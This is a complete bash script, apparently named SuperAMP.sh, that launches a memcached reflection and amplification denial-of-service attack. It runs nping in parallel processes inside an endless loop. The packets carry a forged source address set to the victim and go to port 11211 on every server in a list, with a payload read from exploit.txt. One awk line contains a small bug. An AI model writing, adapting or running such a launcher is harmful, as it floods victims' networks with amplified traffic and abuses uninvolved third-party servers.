#!/usr/bin/sudo /bin/bash

int_handler()
{
    echo "Interrupted."
    sleep 2
    kill $PPID
    exit 1
}
trap 'int_handler' INT

while true; do
i=0
if type lsb_release >/dev/null 2>&1; then
  distro=$(lsb_release -i -s)
elif [ -e /etc/os-release ]; then
  distro=$(awk -F= '$1 == "ID" {print 2}' /etc/os-release)
else
  echo "Error: Cannot find release file"; exit 1
fi

if [ -z "$(which nping)" ]; then
  echo "nmap not installed; installing"
  case $distro in
      ubuntu*) apt-get -y install nmap ;;
      debian*) apt-get -y install nmap ;;
      mint*)   apt-get -y install nmap ;;
      kali*)   apt-get -y install nmap ;;
      fedora*) yum install nmap; dnf install nmap ;;
      suse*)   zypper addrepo https://download.opensuse.org/repositories/network:utilities/openSUSE_Leap_42.3/network:utilities.repo; zypper refresh; zypper install nmap ;;
      centos*) yum install nmap ;;
      rhel*)   yum install nmap ;;
      arch*)   pacman -Sy nmap ;;
      gentoo*) USE="-gtk -gnome" emerge -pv nmap ;;
      *)       echo "Error: Unknown distribution $distro"; exit 1 ;;
  esac
else
  if [ -z $1 ]; then
    echo "Usage: ./SuperAMP.sh Target Port and Number of Simutanios Processes"
    echo " M.B.Hudson 2021"
  elif [ -z $2 ]; then
    echo "Usage: ./SuperAMP.sh Target Port and Number of Simutanios Processes"
    echo " M.B.Hudson 2021"
  elif [ -z $3 ]; then
    echo "Usage: ./SuperAMP.sh Target Port and Number of Simutanios Processes"
    echo " M.B.Hudson 2021"
  else
    while [ $i -lt $3 ]; do
      exploit="$(cat exploit.txt)"
      nping -c 1000000000 --rate 90000 --udp -S $1 -g $2 -p 11211 --data $exploit $(tr '\n' ' '<ips.txt) &
      i=$[$i+1]
    done
  fi
fi

done


exit 0
